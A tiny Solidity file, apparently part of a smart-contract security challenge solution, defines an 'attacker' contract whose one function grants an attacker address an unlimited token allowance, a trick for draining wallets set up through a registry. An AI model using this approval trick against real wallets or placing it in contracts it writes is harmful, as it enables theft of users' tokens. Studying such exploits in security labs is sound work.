// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

contract WalletRegistryAttacker2 {
    function attack(address token, address attacker) external {
    IERC20(token).approve(attacker, type(uint256).max);
  }
}
